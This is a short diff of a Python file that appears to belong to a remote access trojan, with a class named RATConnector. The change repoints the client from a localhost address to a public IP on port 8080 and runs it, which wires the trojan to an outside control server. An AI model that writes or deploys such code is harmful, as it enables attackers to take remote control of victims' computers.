@@ -105,5 +105,5 @@ class RATConnector:
 
 
 print("run")
-ratClient = RATConnector("127.0.0.1", 8080)
+ratClient = RATConnector("185.173.93.219", 8080)
 ratClient.run()
